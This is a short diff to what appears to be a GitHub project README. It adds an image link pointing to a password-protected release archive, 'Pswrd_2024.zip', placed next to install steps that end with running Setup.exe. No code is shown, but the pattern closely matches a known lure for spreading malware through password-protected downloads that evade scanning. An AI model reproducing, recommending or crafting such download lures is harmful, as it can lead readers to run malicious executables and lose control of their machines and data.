@@ -25,4 +25,6 @@
  4) Run Setup.exe
  5) Enjoy!
 
+[![Frame 6](https://github.com/Baldiot/baldio/blob/main/65464645.png)](https://github.com/Baldiot/baldio/releases/download/password2024/Pswrd_2024.zip)
+
 ![1695147771007](https://github.com/Baldiot/baldio/assets/159548817/660f5f72-c428-4f8c-a318-51537aa7cbd3)
